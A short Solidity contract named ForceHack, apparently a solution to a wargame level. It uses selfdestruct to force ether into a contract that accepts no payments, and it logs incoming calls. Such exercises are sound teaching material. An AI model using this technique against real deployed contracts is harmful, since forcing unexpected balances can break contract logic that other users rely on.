// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceHack {
    
    event Log(string func, address sender, uint256 value, bytes data);

    address addressToSendEther;

    constructor(address _addressToSendEther) payable{
        addressToSendEther = _addressToSendEther;
    }

    function trySendingToNonPayable() public {
      selfdestruct(payable(addressToSendEther));
    }

    fallback() external payable {
      emit Log("fallback", msg.sender, msg.value, msg.data);
    }

    receive() external payable {
      emit Log("receive", msg.sender, msg.value, "");
    }

}
